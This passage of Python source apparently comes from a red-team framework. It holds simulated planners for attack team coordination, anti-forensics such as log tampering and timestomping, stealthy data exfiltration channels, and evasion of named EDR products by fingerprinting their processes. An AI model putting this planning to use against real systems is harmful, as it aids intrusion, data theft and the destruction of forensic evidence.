        schedule = self.beacon_schedule.get(deployment_id, {})
        
        # Simulate health check
        health = {
            'deployment_id': deployment_id,
            'mechanism': mechanism.get('name'),
            'target': mechanism.get('target'),
            'status': self.mechanism_health.get(deployment_id, 'unknown'),
            'last_check': datetime.now().isoformat(),
            'beacon_status': 'on_time' if schedule.get('missed_beacons', 0) < 3 else 'delayed',
            'uptime_hours': (datetime.now() - datetime.fromisoformat(
                mechanism.get('deployed_at', datetime.now().isoformat())
            )).total_seconds() / 3600
        }
        
        return health
        
    def create_fallback_chain(self, mechanisms: List[str]):
        """Create ordered fallback chain for persistence."""
        self.fallback_chain = mechanisms
        return {
            'chain': mechanisms,
            'description': 'Fallback order if primary mechanism is detected/removed'
        }
        
    def get_persistence_status(self) -> Dict[str, Any]:
        """Get comprehensive persistence status."""
        status = {
            'active_mechanisms': len(self.active_mechanisms),
            'healthy': sum(1 for h in self.mechanism_health.values() if h == 'healthy'),
            'degraded': sum(1 for h in self.mechanism_health.values() if h == 'degraded'),
            'failed': sum(1 for h in self.mechanism_health.values() if h == 'failed'),
            'mechanisms': []
        }
        
        for dep_id, mechanism in self.active_mechanisms.items():
            status['mechanisms'].append({
                'id': dep_id,
                'name': mechanism.get('name'),
                'target': mechanism.get('target'),
                'health': self.mechanism_health.get(dep_id, 'unknown'),
                'deployed_at': mechanism.get('deployed_at')
            })
            
        return status
        
    def recommend_redundancy(self) -> List[str]:
        """Recommend redundancy improvements."""
        recommendations = []
        
        # Check if we have fallback
        if len(self.active_mechanisms) < 2:
            recommendations.append("‚ö†Ô∏è Deploy at least 2 persistence mechanisms for redundancy")
            
        # Check for diversity
        technique_types = set()
        for mech in self.active_mechanisms.values():
            tech_id = mech.get('mechanism_id', '')
            technique_types.add(tech_id[:5])  # Group by technique family
            
        if len(technique_types) < 2:
            recommendations.append("‚ö†Ô∏è Use diverse technique families to avoid single detection method")
            
        # Check health
        unhealthy = sum(1 for h in self.mechanism_health.values() if h != 'healthy')
        if unhealthy > 0:
            recommendations.append(f"‚ö†Ô∏è {unhealthy} mechanism(s) need attention")
            
        if not self.fallback_chain:
            recommendations.append("‚ö†Ô∏è Create fallback chain for automatic failover")
            
        return recommendations


# =============================================================================
# COLLABORATIVE ATTACK PLANNER - Team-Based Attack Coordination
# =============================================================================

class CollaborativeAttackPlanner:
    """
    Real-time collaborative attack planning and coordination.
    Enables team-based red team operations with role assignment.
    """
    
    def __init__(self):
        self.team_members: Dict[str, Dict] = {}
        self.assigned_tasks: Dict[str, List[str]] = {}
        self.task_status: Dict[str, Dict] = {}
        self.communication_log: List[Dict] = []
        self.shared_intel: Dict[str, Any] = {}
        self.operation_phases: List[Dict] = []
        self.sync_state: Dict[str, Any] = {}
        
    def register_team_member(self, member_id: str, profile: Dict):
        """Register a team member."""
        self.team_members[member_id] = {
            'id': member_id,
            'name': profile.get('name'),
            'role': profile.get('role', 'operator'),
            'specialties': profile.get('specialties', []),
            'status': 'available',
            'current_task': None,
            'joined_at': datetime.now().isoformat(),
            'tasks_completed': 0,
            'capabilities': profile.get('capabilities', [])
        }
        self.assigned_tasks[member_id] = []
        
    def create_operation_phase(self, phase: Dict) -> str:
        """Create a new operation phase."""
        phase_id = f"phase_{len(self.operation_phases) + 1}"
        
        operation_phase = {
            'id': phase_id,
            'name': phase.get('name'),
            'description': phase.get('description'),
            'objectives': phase.get('objectives', []),
            'tasks': phase.get('tasks', []),
            'dependencies': phase.get('dependencies', []),
            'status': 'planned',
            'start_time': None,
            'end_time': None,
            'assigned_team': phase.get('assigned_team', [])
        }
        
        self.operation_phases.append(operation_phase)
        return phase_id
        
    def assign_task(self, member_id: str, task: Dict) -> Dict:
        """Assign task to team member."""
        if member_id not in self.team_members:
            return {'success': False, 'error': 'Member not found'}
            
        task_id = f"task_{int(time.time())}_{random.randint(1000, 9999)}"
        
        task_record = {
            'id': task_id,
            'description': task.get('description'),
            'type': task.get('type'),
            'priority': task.get('priority', 'normal'),
            'target': task.get('target'),
            'technique': task.get('technique'),
            'assigned_to': member_id,
            'assigned_at': datetime.now().isoformat(),
            'status': 'assigned',
            'due_by': task.get('due_by'),
            'dependencies': task.get('dependencies', [])
        }
        
        self.task_status[task_id] = task_record
        self.assigned_tasks[member_id].append(task_id)
        self.team_members[member_id]['status'] = 'busy'
        self.team_members[member_id]['current_task'] = task_id
        
        # Log assignment
        self._log_communication({
            'type': 'task_assignment',
            'task_id': task_id,
            'assigned_to': member_id,
            'description': task.get('description')
        })
        
        return {'success': True, 'task_id': task_id}
        
    def update_task_status(self, task_id: str, status: str, notes: str = None):
        """Update task status."""
        if task_id not in self.task_status:
            return {'success': False, 'error': 'Task not found'}
            
        self.task_status[task_id]['status'] = status
        if notes:
            self.task_status[task_id]['notes'] = notes
            
        if status == 'completed':
            self.task_status[task_id]['completed_at'] = datetime.now().isoformat()
            member_id = self.task_status[task_id].get('assigned_to')
            if member_id in self.team_members:
                self.team_members[member_id]['status'] = 'available'
                self.team_members[member_id]['current_task'] = None
                self.team_members[member_id]['tasks_completed'] += 1
                
        # Log status change
        self._log_communication({
            'type': 'status_update',
            'task_id': task_id,
            'new_status': status,
            'notes': notes
        })
        
        return {'success': True}
        
    def share_intelligence(self, intel_type: str, data: Dict):
        """Share intelligence with team."""
        intel_id = f"intel_{int(time.time())}"
        
        intel_record = {
            'id': intel_id,
            'type': intel_type,
            'data': data,
            'shared_at': datetime.now().isoformat(),
            'shared_by': data.get('shared_by', 'system'),
            'priority': data.get('priority', 'normal')
        }
        
        self.shared_intel[intel_id] = intel_record
        
        # Log intel share
        self._log_communication({
            'type': 'intel_shared',
            'intel_id': intel_id,
            'intel_type': intel_type,
            'summary': data.get('summary', '')
        })
        
        return intel_id
        
    def _log_communication(self, entry: Dict):
        """Log team communication."""
        entry['timestamp'] = datetime.now().isoformat()
        self.communication_log.append(entry)
        
    def get_team_status(self) -> Dict[str, Any]:
        """Get comprehensive team status."""
        return {
            'total_members': len(self.team_members),
            'available': sum(1 for m in self.team_members.values() if m['status'] == 'available'),
            'busy': sum(1 for m in self.team_members.values() if m['status'] == 'busy'),
            'members': list(self.team_members.values()),
            'active_tasks': sum(1 for t in self.task_status.values() if t['status'] in ['assigned', 'in_progress']),
            'completed_tasks': sum(1 for t in self.task_status.values() if t['status'] == 'completed'),
            'shared_intel_count': len(self.shared_intel)
        }
        
    def get_operation_progress(self) -> Dict[str, Any]:
        """Get operation progress across phases."""
        progress = {
            'phases': [],
            'overall_progress': 0
        }
        
        completed_phases = 0
        for phase in self.operation_phases:
            phase_tasks = [t for t in self.task_status.values() 
                         if t.get('phase_id') == phase['id']]
            completed = sum(1 for t in phase_tasks if t['status'] == 'completed')
            total = len(phase_tasks) or 1
            
            phase_progress = {
                'id': phase['id'],
                'name': phase['name'],
                'status': phase['status'],
                'progress_percent': (completed / total) * 100,
                'tasks_completed': completed,
                'tasks_total': len(phase_tasks)
            }
            progress['phases'].append(phase_progress)
            
            if phase['status'] == 'completed':
                completed_phases += 1
                
        progress['overall_progress'] = (completed_phases / len(self.operation_phases) * 100) if self.operation_phases else 0
        
        return progress
        
    def recommend_task_assignment(self, task: Dict) -> List[Dict]:
        """Recommend best team member for task."""
        recommendations = []
        
        task_type = task.get('type', '')
        required_skills = task.get('required_skills', [])
        
        for member_id, member in self.team_members.items():
            if member['status'] != 'available':
                continue
                
            score = 0
            reasons = []
            
            # Check specialties match
            specialty_match = len(set(member.get('specialties', [])) & set(required_skills))
            score += specialty_match * 20
            if specialty_match:
                reasons.append(f"Has {specialty_match} matching specialties")
                
            # Check capabilities
            cap_match = len(set(member.get('capabilities', [])) & set(required_skills))
            score += cap_match * 15
            if cap_match:
                reasons.append(f"Has {cap_match} matching capabilities")
                
            # Consider workload (fewer completed = fresher)
            if member.get('tasks_completed', 0) < 3:
                score += 10
                reasons.append("Low current workload")
                
            recommendations.append({
                'member_id': member_id,
                'name': member.get('name'),
                'score': score,
                'reasons': reasons
            })
            
        recommendations.sort(key=lambda x: x['score'], reverse=True)
        return recommendations[:3]


# =============================================================================
# ANTI-FORENSICS MODULE - Evidence Minimization Engine
# =============================================================================

class AntiForensicsModule:
    """
    Advanced anti-forensics and evidence minimization.
    Helps plan and track evidence cleanup during attack chains.
    """
    
    ARTIFACT_TYPES = {
        'file': {
            'cleanup_methods': ['secure_delete', 'timestomping', 'slack_space_wipe'],
            'detection_sources': ['file_monitoring', 'mft_analysis', 'usn_journal'],
            'persistence_level': 'high'
        },
        'registry': {
            'cleanup_methods': ['key_deletion', 'value_modification', 'timestamp_modification'],
            'detection_sources': ['registry_monitoring', 'reg_hive_analysis'],
            'persistence_level': 'high'
        },
        'event_log': {
            'cleanup_methods': ['log_clearing', 'selective_deletion', 'log_tampering'],
            'detection_sources': ['siem', 'log_forwarding', 'event_log_monitoring'],
            'persistence_level': 'medium'
        },
        'memory': {
            'cleanup_methods': ['process_hollowing', 'memory_patching', 'process_termination'],
            'detection_sources': ['memory_forensics', 'edr', 'process_monitoring'],
            'persistence_level': 'low'
        },
        'network': {
            'cleanup_methods': ['connection_termination', 'dns_cache_flush', 'arp_cache_clear'],
            'detection_sources': ['network_monitoring', 'flow_analysis', 'pcap'],
            'persistence_level': 'low'
        },
        'prefetch': {
            'cleanup_methods': ['prefetch_deletion', 'timestomping'],
            'detection_sources': ['prefetch_analysis', 'file_monitoring'],
            'persistence_level': 'high'
        },
        'shimcache': {
            'cleanup_methods': ['registry_modification', 'cache_clearing'],
            'detection_sources': ['shimcache_analysis', 'registry_forensics'],
            'persistence_level': 'high'
        }
    }
    
    def __init__(self):
        self.tracked_artifacts: List[Dict] = []
        self.cleanup_plan: List[Dict] = []
        self.cleanup_status: Dict[str, str] = {}
        self.evidence_score: float = 0.0
        
    def track_artifact(self, artifact: Dict) -> str:
        """Track a forensic artifact created during attack."""
        artifact_id = f"artifact_{len(self.tracked_artifacts) + 1}"
        
        tracked = {
            'id': artifact_id,
            'type': artifact.get('type', 'unknown'),
            'location': artifact.get('location'),
            'created_at': artifact.get('created_at', datetime.now().isoformat()),
            'created_by_technique': artifact.get('technique'),
            'description': artifact.get('description'),
            'criticality': artifact.get('criticality', 'medium'),
            'cleanup_status': 'pending',
            'cleanup_method': None
        }
        
        self.tracked_artifacts.append(tracked)
        self._update_evidence_score()
        
        return artifact_id
        
    def _update_evidence_score(self):
        """Update overall evidence exposure score."""
        score = 0
        
        for artifact in self.tracked_artifacts:
            if artifact['cleanup_status'] != 'cleaned':
                artifact_type = self.ARTIFACT_TYPES.get(artifact['type'], {})
                persistence = artifact_type.get('persistence_level', 'medium')
                
                if persistence == 'high':
                    score += 10
                elif persistence == 'medium':
                    score += 5
                else:
                    score += 2
                    
                if artifact.get('criticality') == 'high':
                    score *= 1.5
                    
        self.evidence_score = min(100, score)
        
    def plan_cleanup(self, strategy: str = 'balanced') -> List[Dict]:
        """Plan artifact cleanup based on strategy."""
        self.cleanup_plan = []
        
        # Sort artifacts by criticality and persistence
        sorted_artifacts = sorted(
            [a for a in self.tracked_artifacts if a['cleanup_status'] == 'pending'],
            key=lambda x: (
                1 if x.get('criticality') == 'high' else (2 if x.get('criticality') == 'medium' else 3),
                1 if self.ARTIFACT_TYPES.get(x['type'], {}).get('persistence_level') == 'high' else 2
            )
        )
        
        for artifact in sorted_artifacts:
            artifact_type = self.ARTIFACT_TYPES.get(artifact['type'], {})
            cleanup_methods = artifact_type.get('cleanup_methods', ['unknown'])
            
            # Select method based on strategy
            if strategy == 'aggressive':
                method = cleanup_methods[0] if cleanup_methods else 'secure_delete'
            elif strategy == 'stealthy':
                method = cleanup_methods[-1] if cleanup_methods else 'timestomping'
            else:
                method = cleanup_methods[len(cleanup_methods)//2] if cleanup_methods else 'standard_delete'
                
            cleanup_step = {
                'artifact_id': artifact['id'],
                'artifact_type': artifact['type'],
                'location': artifact['location'],
                'method': method,
                'priority': artifact.get('criticality', 'medium'),
                'estimated_time': self._estimate_cleanup_time(artifact['type'], method),
                'detection_risk': self._assess_cleanup_detection_risk(method)
            }
            self.cleanup_plan.append(cleanup_step)
            
        return self.cleanup_plan
        
    def _estimate_cleanup_time(self, artifact_type: str, method: str) -> int:
        """Estimate cleanup time in seconds."""
        base_times = {
            'file': 5,
            'registry': 3,
            'event_log': 30,
            'memory': 2,
            'network': 1,
            'prefetch': 5,
            'shimcache': 10
        }
        
        method_multipliers = {
            'secure_delete': 3,
            'timestomping': 1,
            'selective_deletion': 5,
            'standard_delete': 1
        }
        
        base = base_times.get(artifact_type, 5)
        multiplier = method_multipliers.get(method, 1)
        
        return base * multiplier
        
    def _assess_cleanup_detection_risk(self, method: str) -> str:
        """Assess detection risk of cleanup method."""
        risky_methods = ['log_clearing', 'secure_delete', 'log_tampering']
        stealthy_methods = ['timestomping', 'process_termination', 'memory_patching']
        
        if method in risky_methods:
            return 'high'
        elif method in stealthy_methods:
            return 'low'
        else:
            return 'medium'
            
    def execute_cleanup_step(self, artifact_id: str) -> Dict:
        """Execute cleanup for artifact (simulated)."""
        artifact = next((a for a in self.tracked_artifacts if a['id'] == artifact_id), None)
        if not artifact:
            return {'success': False, 'error': 'Artifact not found'}
            
        cleanup_step = next((c for c in self.cleanup_plan if c['artifact_id'] == artifact_id), None)
        if not cleanup_step:
            return {'success': False, 'error': 'No cleanup plan for artifact'}
            
        # Simulate cleanup
        success_probability = 0.95 if cleanup_step['detection_risk'] == 'low' else 0.8
        success = random.random() < success_probability
        
        if success:
            artifact['cleanup_status'] = 'cleaned'
            artifact['cleanup_method'] = cleanup_step['method']
            artifact['cleaned_at'] = datetime.now().isoformat()
            self._update_evidence_score()
            
        return {
            'success': success,
            'artifact_id': artifact_id,
            'method_used': cleanup_step['method'],
            'new_evidence_score': self.evidence_score
        }
        
    def get_forensic_exposure_report(self) -> Dict[str, Any]:
        """Generate forensic exposure assessment."""
        pending = [a for a in self.tracked_artifacts if a['cleanup_status'] == 'pending']
        cleaned = [a for a in self.tracked_artifacts if a['cleanup_status'] == 'cleaned']
        
        # Group by type
        by_type = {}
        for artifact in self.tracked_artifacts:
            art_type = artifact['type']
            if art_type not in by_type:
                by_type[art_type] = {'total': 0, 'pending': 0, 'cleaned': 0}
            by_type[art_type]['total'] += 1
            if artifact['cleanup_status'] == 'cleaned':
                by_type[art_type]['cleaned'] += 1
            else:
                by_type[art_type]['pending'] += 1
                
        return {
            'evidence_score': self.evidence_score,
            'risk_level': 'high' if self.evidence_score > 70 else ('medium' if self.evidence_score > 30 else 'low'),
            'total_artifacts': len(self.tracked_artifacts),
            'pending_cleanup': len(pending),
            'cleaned': len(cleaned),
            'by_type': by_type,
            'recommendations': self._generate_cleanup_recommendations()
        }
        
    def _generate_cleanup_recommendations(self) -> List[str]:
        """Generate cleanup recommendations."""
        recs = []
        
        pending = [a for a in self.tracked_artifacts if a['cleanup_status'] == 'pending']
        
        # High criticality pending
        high_crit = [a for a in pending if a.get('criticality') == 'high']
        if high_crit:
            recs.append(f"üö® {len(high_crit)} HIGH criticality artifacts need immediate cleanup")
            
        # Check for persistent artifact types
        persistent = [a for a in pending if 
                     self.ARTIFACT_TYPES.get(a['type'], {}).get('persistence_level') == 'high']
        if persistent:
            recs.append(f"‚ö†Ô∏è {len(persistent)} artifacts have high forensic persistence")
            
        # Event log recommendations
        log_artifacts = [a for a in pending if a['type'] == 'event_log']
        if log_artifacts:
            recs.append(f"üìã Consider selective event log cleanup vs full clear to avoid detection")
            
        if self.evidence_score > 50:
            recs.append("üéØ Evidence score high - prioritize cleanup before exfiltration")
            
        return recs


# =============================================================================
# EXFILTRATION PLANNER - Data Exfiltration Intelligence
# =============================================================================

class ExfiltrationPlanner:
    """
    Advanced data exfiltration planning and execution tracking.
    Optimizes data extraction methods based on detection risk.
    """
    
    EXFIL_CHANNELS = {
        'https': {
            'bandwidth': 'high',
            'stealth': 7,
            'reliability': 9,
            'detection_methods': ['ssl_inspection', 'proxy_logs', 'domain_reputation'],
            'requirements': ['outbound_443']
        },
        'dns': {
            'bandwidth': 'very_low',
            'stealth': 8,
            'reliability': 9,
            'detection_methods': ['dns_analytics', 'query_volume', 'entropy_analysis'],
            'requirements': ['dns_resolution']
        },
        'icmp': {
            'bandwidth': 'low',
            'stealth': 6,
            'reliability': 6,
            'detection_methods': ['icmp_analysis', 'packet_size_anomaly'],
            'requirements': ['icmp_allowed']
        },
        'smb': {
            'bandwidth': 'high',
            'stealth': 3,
            'reliability': 8,
            'detection_methods': ['smb_monitoring', 'file_access_logs'],
            'requirements': ['smb_access', 'file_share']
        },
        'cloud_sync': {
            'bandwidth': 'high',
            'stealth': 6,
            'reliability': 8,
            'detection_methods': ['cloud_access_logs', 'dlp'],
            'requirements': ['cloud_service_access']
        },
        'email': {
            'bandwidth': 'medium',
            'stealth': 4,
            'reliability': 7,
            'detection_methods': ['email_gateway', 'dlp', 'attachment_scanning'],
            'requirements': ['smtp_access']
        },
        'physical': {
            'bandwidth': 'very_high',
            'stealth': 2,
            'reliability': 9,
            'detection_methods': ['usb_monitoring', 'physical_security'],
            'requirements': ['physical_access', 'removable_media']
        },
        'steganography': {
            'bandwidth': 'very_low',
            'stealth': 9,
            'reliability': 7,
            'detection_methods': ['steg_analysis', 'file_carving'],
            'requirements': ['cover_medium', 'steg_tools']
        }
    }
    
    def __init__(self):
        self.target_data: List[Dict] = []
        self.exfil_plan: List[Dict] = []
        self.staging_areas: List[Dict] = []
        self.completed_exfil: List[Dict] = []
        self.total_exfil_bytes: int = 0
        
    def identify_target_data(self, data: Dict) -> str:
        """Identify data for exfiltration."""
        data_id = f"data_{len(self.target_data) + 1}"
        
        target = {
            'id': data_id,
            'name': data.get('name'),
            'type': data.get('type', 'unknown'),
            'location': data.get('location'),
            'size_bytes': data.get('size_bytes', 0),
            'sensitivity': data.get('sensitivity', 'medium'),
            'format': data.get('format'),
            'compression_ratio': data.get('compression_ratio', 0.5),
            'encryption_required': data.get('encryption_required', True),
            'priority': data.get('priority', 'normal'),
            'status': 'identified'
        }
        
        self.target_data.append(target)
        return data_id
        
    def create_staging_area(self, staging: Dict) -> str:
        """Create data staging area."""
        staging_id = f"staging_{len(self.staging_areas) + 1}"
        
        area = {
            'id': staging_id,
            'location': staging.get('location'),
            'type': staging.get('type', 'filesystem'),
            'capacity_bytes': staging.get('capacity_bytes', 1024*1024*100),
            'current_usage': 0,
            'encryption_enabled': staging.get('encryption_enabled', True),
            'compression_enabled': staging.get('compression_enabled', True),
            'data_staged': []
        }
        
        self.staging_areas.append(area)
        return staging_id
        
    def plan_exfiltration(self, constraints: Dict = None) -> List[Dict]:
        """Plan optimal exfiltration strategy."""
        constraints = constraints or {}
        
        max_bandwidth = constraints.get('max_bandwidth', 'high')
        min_stealth = constraints.get('min_stealth', 5)
        available_channels = constraints.get('available_channels', list(self.EXFIL_CHANNELS.keys()))
        
        # Filter channels by constraints
        valid_channels = []
        for channel_name, channel in self.EXFIL_CHANNELS.items():
            if channel_name not in available_channels:
                continue
            if channel.get('stealth', 0) < min_stealth:
                continue
            valid_channels.append((channel_name, channel))
            
        # Sort by stealth
        valid_channels.sort(key=lambda x: x[1].get('stealth', 0), reverse=True)
        
        # Create exfil plan
        self.exfil_plan = []
        
        for data in self.target_data:
            if data['status'] != 'identified':
                continue
                
            data_size = data.get('size_bytes', 0)
            compressed_size = int(data_size * data.get('compression_ratio', 0.5))
            
            # Select channel based on data size and stealth requirements
            selected_channel = None
            for channel_name, channel in valid_channels:
                bandwidth = channel.get('bandwidth', 'medium')
                
                # Match bandwidth to data size
                if data_size > 100*1024*1024 and bandwidth in ['very_low', 'low']:
                    continue
                    
                selected_channel = (channel_name, channel)
                break
                
            if not selected_channel:
                selected_channel = valid_channels[0] if valid_channels else ('https', self.EXFIL_CHANNELS['https'])
                
            # Calculate exfil parameters
            channel_name, channel = selected_channel
            chunks = self._calculate_chunks(compressed_size, channel.get('bandwidth', 'medium'))
            
            exfil_step = {
                'data_id': data['id'],
                'data_name': data.get('name'),
                'original_size': data_size,
                'compressed_size': compressed_size,
                'channel': channel_name,
                'chunks': chunks,
                'estimated_time': self._estimate_exfil_time(compressed_size, channel.get('bandwidth', 'medium')),
                'stealth_rating': channel.get('stealth'),
                'detection_risk': self._assess_detection_risk(channel),
                'protocol_details': self._get_protocol_details(channel_name)
            }
            
            self.exfil_plan.append(exfil_step)
            
        return self.exfil_plan
        
    def _calculate_chunks(self, size_bytes: int, bandwidth: str) -> int:
        """Calculate number of chunks for exfiltration."""
        chunk_sizes = {
            'very_low': 256,  # DNS-like
            'low': 1024,
            'medium': 64*1024,
            'high': 1024*1024,
            'very_high': 100*1024*1024
        }
        
        chunk_size = chunk_sizes.get(bandwidth, 64*1024)
        return max(1, size_bytes // chunk_size)
        
    def _estimate_exfil_time(self, size_bytes: int, bandwidth: str) -> int:
        """Estimate exfiltration time in seconds."""
        speeds = {
            'very_low': 10,  # bytes per second
            'low': 1000,
            'medium': 100*1024,
            'high': 1024*1024,
            'very_high': 10*1024*1024
        }
        
        speed = speeds.get(bandwidth, 100*1024)
        return max(1, size_bytes // speed)
        
    def _assess_detection_risk(self, channel: Dict) -> str:
        """Assess detection risk for channel."""
        stealth = channel.get('stealth', 5)
        detection_methods = len(channel.get('detection_methods', []))
        
        risk_score = (10 - stealth) + (detection_methods * 2)
        
        if risk_score > 10:
            return 'high'
        elif risk_score > 5:
            return 'medium'
        else:
            return 'low'
            
    def _get_protocol_details(self, channel: str) -> Dict:
        """Get protocol-specific exfiltration details."""
        details = {
            'https': {
                'port': 443,
                'encoding': 'base64',
                'header_hiding': True,
                'recommended_domains': ['*.cloudfront.net', '*.akamaized.net']
            },
            'dns': {
                'record_type': 'TXT',
                'subdomain_encoding': 'base32',
                'max_label_length': 63,
                'query_delay_ms': 100
            },
            'icmp': {
                'type': 'echo_request',
                'max_payload': 48,
                'sequence_encoding': True
            },
            'cloud_sync': {
                'services': ['onedrive', 'gdrive', 'dropbox'],
                'chunk_size_mb': 10,
                'resume_support': True
            },
            'email': {
                'encoding': 'base64',
                'attachment_limit_mb': 25,
                'smtp_port': 587
            },
            'steganography': {
                'cover_types': ['png', 'jpg', 'mp3'],
                'bits_per_pixel': 2,
                'payload_capacity': 0.1
            }
        }
        
        return details.get(channel, {})
        
    def execute_exfil_chunk(self, data_id: str, chunk_num: int) -> Dict:
        """Execute exfiltration of a single chunk (simulated)."""
        plan = next((p for p in self.exfil_plan if p['data_id'] == data_id), None)
        if not plan:
            return {'success': False, 'error': 'No plan found'}
            
        # Simulate success
        success_prob = 0.95 if plan['detection_risk'] == 'low' else 0.85
        success = random.random() < success_prob
        
        chunk_size = plan['compressed_size'] // plan['chunks']
        
        if success:
            self.total_exfil_bytes += chunk_size
            
        return {
            'success': success,
            'chunk': chunk_num,
            'total_chunks': plan['chunks'],
            'bytes_transferred': chunk_size if success else 0,
            'channel': plan['channel'],
            'total_exfil_bytes': self.total_exfil_bytes
        }
        
    def get_exfil_status(self) -> Dict[str, Any]:
        """Get exfiltration status."""
        total_target_size = sum(d.get('size_bytes', 0) for d in self.target_data)
        
        return {
            'target_data_count': len(self.target_data),
            'total_target_size_mb': total_target_size / (1024*1024),
            'exfil_plan_steps': len(self.exfil_plan),
            'completed_exfils': len(self.completed_exfil),
            'total_bytes_exfiltrated': self.total_exfil_bytes,
            'staging_areas': len(self.staging_areas),
            'channels_in_use': list(set(p['channel'] for p in self.exfil_plan))
        }


# =============================================================================
# DETECTION EVASION OPTIMIZER - EDR/AV Bypass Intelligence
# =============================================================================

class DetectionEvasionOptimizer:
    """
    Advanced detection evasion and bypass optimization.
    Provides real-time evasion recommendations based on defense posture.
    """
    
    EVASION_TECHNIQUES = {
        'process_injection': {
            'T1055.001': {'name': 'DLL Injection', 'stealth': 4, 'complexity': 3},
            'T1055.002': {'name': 'PE Injection', 'stealth': 5, 'complexity': 5},
            'T1055.003': {'name': 'Thread Execution Hijacking', 'stealth': 6, 'complexity': 6},
            'T1055.004': {'name': 'Asynchronous Procedure Call', 'stealth': 7, 'complexity': 7},
            'T1055.012': {'name': 'Process Hollowing', 'stealth': 8, 'complexity': 8}
        },
        'defense_evasion': {
            'T1140': {'name': 'Deobfuscate/Decode', 'stealth': 5, 'complexity': 3},
            'T1027': {'name': 'Obfuscated Files', 'stealth': 6, 'complexity': 4},
            'T1562.001': {'name': 'Disable Security Tools', 'stealth': 2, 'complexity': 5},
            'T1070.004': {'name': 'File Deletion', 'stealth': 4, 'complexity': 2},
            'T1497': {'name': 'Virtualization/Sandbox Evasion', 'stealth': 7, 'complexity': 6}
        },
        'signature_bypass': {
            'polymorphic': {'name': 'Polymorphic Code', 'stealth': 8, 'complexity': 7},
            'metamorphic': {'name': 'Metamorphic Engine', 'stealth': 9, 'complexity': 9},
            'packing': {'name': 'Custom Packer', 'stealth': 5, 'complexity': 5},
            'crypter': {'name': 'Crypter/FUD', 'stealth': 7, 'complexity': 6}
        },
        'memory_evasion': {
            'direct_syscall': {'name': 'Direct Syscalls', 'stealth': 8, 'complexity': 7},
            'unhooking': {'name': 'NTDLL Unhooking', 'stealth': 7, 'complexity': 6},
            'indirect_syscall': {'name': 'Indirect Syscalls', 'stealth': 9, 'complexity': 8},
            'hardware_breakpoints': {'name': 'Hardware Breakpoint Evasion', 'stealth': 8, 'complexity': 7}
        }
    }
    
    EDR_DETECTION_CAPABILITIES = {
        'crowdstrike': {
            'process_injection': 9,
            'memory_scanning': 9,
            'behavior_analysis': 9,
            'ml_detection': 8,
            'cloud_lookup': 9
        },
        'sentinelone': {
            'process_injection': 8,
            'memory_scanning': 8,
            'behavior_analysis': 9,
            'ml_detection': 9,
            'cloud_lookup': 8
        },
        'defender_atp': {
            'process_injection': 7,
            'memory_scanning': 7,
            'behavior_analysis': 8,
            'ml_detection': 7,
            'cloud_lookup': 8
        },
        'cylance': {
            'process_injection': 6,
            'memory_scanning': 6,
            'behavior_analysis': 5,
            'ml_detection': 9,
            'cloud_lookup': 7
        },
        'carbon_black': {
            'process_injection': 8,
            'memory_scanning': 7,
            'behavior_analysis': 8,
            'ml_detection': 6,
            'cloud_lookup': 7
        }
    }
    
    def __init__(self):
        self.detected_defenses: Dict[str, Dict] = {}
        self.evasion_history: List[Dict] = []
        self.success_rates: Dict[str, float] = {}
        self.current_profile: Dict[str, Any] = {}
        
    def fingerprint_defenses(self, indicators: Dict) -> Dict[str, Any]:
        """Fingerprint defensive technologies in target environment."""
        fingerprint = {
            'av_products': [],
            'edr_products': [],
            'logging_level': 'unknown',
            'siem_detected': False,
            'amsi_enabled': True,
            'etw_enabled': True,
            'script_block_logging': False
        }
        
        # Analyze process list
        processes = indicators.get('processes', [])
        av_edr_signatures = {
            'MsMpEng.exe': 'defender',
            'CSFalconService.exe': 'crowdstrike',
            'SentinelAgent.exe': 'sentinelone',
            'CylanceSvc.exe': 'cylance',
            'cb.exe': 'carbon_black',
            'MSSense.exe': 'defender_atp',
            'mcshield.exe': 'mcafee',
            'savservice.exe': 'sophos',
            'kavfs.exe': 'kaspersky'
        }
        
        for proc in processes:
            if proc in av_edr_signatures:
                product = av_edr_signatures[proc]
                if product in self.EDR_DETECTION_CAPABILITIES:
                    fingerprint['edr_products'].append(product)
                else:
                    fingerprint['av_products'].append(product)
                    
        # Check for logging indicators
        if indicators.get('sysmon_installed'):
            fingerprint['logging_level'] = 'high'
            fingerprint['siem_detected'] = True
            
        if indicators.get('powershell_logging'):
            fingerprint['script_block_logging'] = True
            
        self.detected_defenses = fingerprint
        return fingerprint
        
    def recommend_evasion_strategy(self, attack_type: str) -> List[Dict]:
        """Recommend evasion strategy based on detected defenses."""
        recommendations = []
        
        edr_products = self.detected_defenses.get('edr_products', [])
        
        # Determine most restrictive EDR
        max_capability = {}
        for edr in edr_products:
            caps = self.EDR_DETECTION_CAPABILITIES.get(edr, {})
            for cap, score in caps.items():
                if score > max_capability.get(cap, 0):
                    max_capability[cap] = score
                    
        # Select evasion techniques that counter detected capabilities
        for category, techniques in self.EVASION_TECHNIQUES.items():
            for tech_id, tech in techniques.items():
                # Calculate bypass probability
                relevant_cap = self._map_technique_to_capability(category)
                detection_score = max_capability.get(relevant_cap, 5)
                stealth = tech.get('stealth', 5)
                
                bypass_prob = (stealth / 10) * (1 - detection_score / 12)
                
                if bypass_prob > 0.3:
                    recommendations.append({
                        'technique_id': tech_id,
                        'name': tech.get('name'),
                        'category': category,
                        'bypass_probability': round(bypass_prob, 2),
                        'complexity': tech.get('complexity'),
                        'stealth': stealth,
                        'counters_edr': edr_products
                    })
                    
        # Sort by bypass probability
        recommendations.sort(key=lambda x: x['bypass_probability'], reverse=True)
        
        return recommendations[:10]
        
    def _map_technique_to_capability(self, category: str) -> str:
        """Map evasion category to EDR capability."""
        mapping = {
            'process_injection': 'process_injection',
            'defense_evasion': 'behavior_analysis',
            'signature_bypass': 'ml_detection',
            'memory_evasion': 'memory_scanning'
        }
        return mapping.get(category, 'behavior_analysis')
        
    def generate_evasive_chain(self, base_chain: List[Dict]) -> List[Dict]:
        """Generate evasive version of attack chain."""
        evasive_chain = []
        
        for step in base_chain:
            evasive_step = step.copy()
            
            # Add pre-execution evasion
            pre_evasion = self._select_pre_execution_evasion(step)
            if pre_evasion:
                evasive_step['pre_evasion'] = pre_evasion
                
            # Add runtime evasion
            runtime_evasion = self._select_runtime_evasion(step)
            if runtime_evasion:
                evasive_step['runtime_evasion'] = runtime_evasion
                
            # Add post-execution cleanup
            cleanup = self._select_cleanup_method(step)
            if cleanup:
                evasive_step['post_cleanup'] = cleanup
                
            evasive_chain.append(evasive_step)
            
        return evasive_chain
        
    def _select_pre_execution_evasion(self, step: Dict) -> Dict:
        """Select pre-execution evasion technique."""
        evasions = []
        
        # Check for AMSI bypass need
